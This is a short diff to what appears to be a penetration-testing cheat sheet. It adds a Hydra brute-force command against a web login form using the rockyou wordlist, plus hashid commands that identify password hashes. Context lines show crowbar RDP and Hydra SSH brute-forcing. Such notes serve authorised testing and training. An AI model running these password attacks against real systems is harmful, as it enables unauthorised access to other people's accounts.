@@ -29,4 +29,10 @@ crowbar -b rdp -s 10.11.0.22/32 -u admin -C ~/password-file.txt -n 1
 ### Hydra
 ```
 hydra -l kali -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1
+hydra 10.11.0.22 http-form-post "/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f(stop the attack when the first successful result is found)
+```
+### Hash Identification
+```
+hashid c43ee559d69bc7f691fe2fbfe8a5ef0a
+hashid '$6$l5bL6XIASslBwwUD$bCxeTlbhTH76wE.bI66aMYSeDXKQ8s7JNFwa1s1KkTand6ZsqQKAF3G0tHD9bd59e5NAz/s7DQcAojRTWNpZX0'
 ```
